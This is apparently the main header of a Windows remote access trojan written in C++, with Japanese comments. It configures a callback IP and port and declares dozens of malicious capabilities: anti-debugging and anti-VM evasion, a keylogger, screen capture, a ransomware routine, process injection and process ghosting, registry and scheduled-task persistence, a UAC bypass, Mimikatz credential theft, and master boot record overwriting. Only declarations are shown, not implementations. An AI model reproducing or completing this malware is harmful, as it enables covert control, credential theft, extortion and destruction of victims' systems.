#pragma once


#include <map>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <string>
#include <iomanip>
#include <Winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <MSWSock.h>
#include <lmcons.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <set>
#include <thread>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <random>
#include "NtAPi.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")

struct Arg {
    char ipAddress[255] = "127.0.0.1";
    char portstr[255] = "4444";
    char antiDbg[255] = "Yes1";
    char antiVM[255] = "Yes2";
};

// デフォルトバッファ
constexpr auto DEFAULT_BUFLEN = 4096;

extern SOCKET mainSocket;
extern std::set<std::string> helpOptions;
extern const std::string newline;

using CommandFunction = void(*)(std::vector<std::string>&);

// アンチデバッグ
void IsDebuggerPresentByAPI();
void NtGlobalFlagByPEB();
void CheckRemoteDebugger();
void WindowNameBlock();
void IsProcessRunning();
void AntiDbg();

// アンチ仮想マシン
void CheckBIOS();
void CheckProcesses();
void CheckDrivers();
void CheckRegistry();
void AntiVM();

// コマンドリスト
void Help(std::vector<std::string>& tokens);
void Netstat(std::vector<std::string>& tokens);
void Pwd(std::vector<std::string>& tokens);
void ProcessList(std::vector<std::string>& tokens);
void Copy(std::vector<std::string>& tokens);
void Move(std::vector<std::string>& tokens);
void Remove(std::vector<std::string>& tokens);
void Dir(std::vector<std::string>& tokens);
void Cat(std::vector<std::string>& tokens);
void Write(std::vector<std::string>& tokens);
void Touch(std::vector<std::string>& tokens);
void TerminateProcess(std::vector<std::string>& tokens);
void CreateNewProcess(std::vector<std::string>& tokens);
void ListProcessModule(std::vector<std::string>& tokens);
void RunPowerShellCommand(std::vector<std::string>& tokens);
void Cd(std::vector<std::string>& tokens);
void ScreenShot(std::vector<std::string>& tokens);
void UploadFile(std::vector<std::string>& tokens);
void DownloadFile(std::vector<std::string>& tokens);
void MkDir(std::vector<std::string>& tokens);
void Rmdir(std::vector<std::string>& tokens);
void KerLogger(std::vector<std::string>& tokens);
void TimedScreenshot(std::vector<std::string>& tokens);
void ShutDown(std::vector<std::string>& tokens);
void Reboot(std::vector<std::string>& tokens);
void Ransom(std::vector<std::string>& tokens);

// 水平展開
void Portscan(std::vector<std::string>& tokens);

// ペイロード読み込みコマンド
void DllLoad(std::vector<std::string>& tokens);

// プロセスインジェクションコマンド
void DllInjection(std::vector<std::string>& tokens);
void ShellcodeInjection(std::vector<std::string>& tokens);
void AsyncProcedureCallDllInjection(std::vector<std::string>& tokens);
void FilelessTransactionHollowing(std::vector<std::string>& tokens);
void FilelessShellcodeInjection(std::vector<std::string>& tokens);
void FilelessReflectiveDLLInjection(std::vector<std::string>& tokens);
void TransactionHollowing(std::vector<std::string>& tokens);
void ProcessGhosting(std::vector<std::string>& tokens);

// 持続性メカニズム
void RunRegistry(std::vector<std::string>& tokens);
void TaskSchedule(std::vector<std::string>& tokens);
void CreateShortcutInStartup(std::vector<std::string>& tokens);

// エクスプロイト
void FodhelperUacBypass(std::vector<std::string>& tokens);
void KDMapper(std::vector<std::string>& tokens);
void Mimikatz(std::vector<std::string>& tokens);

// その他コマンド
void ShowMessageBox(std::vector<std::string>& tokens);
void SystemCrash(std::vector<std::string>& tokens);
void GdiEffect(std::vector<std::string>& tokens);
void TerminateCriticalProcess(std::vector<std::string>& tokens);

void OverWriteMBR(std::vector<std::string>& tokens);

// その他関数
std::wstring ConvertToWString(const std::string& str);
void SendString(const std::string& message);
std::vector<std::string> ParseCommand(const std::string& input);
void ExecuteCommand(std::vector<std::string>& tokens);
void SendPrompt(SOCKET mainSocket);
std::string generateRandomFileName();